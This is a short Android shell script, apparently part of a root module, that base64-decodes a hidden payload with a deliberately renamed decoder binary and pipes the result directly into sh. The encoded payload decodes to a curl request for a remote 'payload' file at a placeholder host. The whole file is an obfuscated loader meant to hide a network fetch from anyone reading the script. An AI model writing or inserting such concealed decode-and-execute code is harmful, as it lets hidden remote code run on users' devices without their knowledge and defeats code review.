#!/system/bin/sh
PAYLOAD=IyEvc3lzdGVtL2Jpbi9zaApjdXJsIGh0dHBzOi8vZXhhbXBsZS5jb20vcGF5bG9hZAo=
DECODER="$MODPATH/bin/renamed-tool"
echo "$PAYLOAD" | "$DECODER" enc -d -base64 | sh
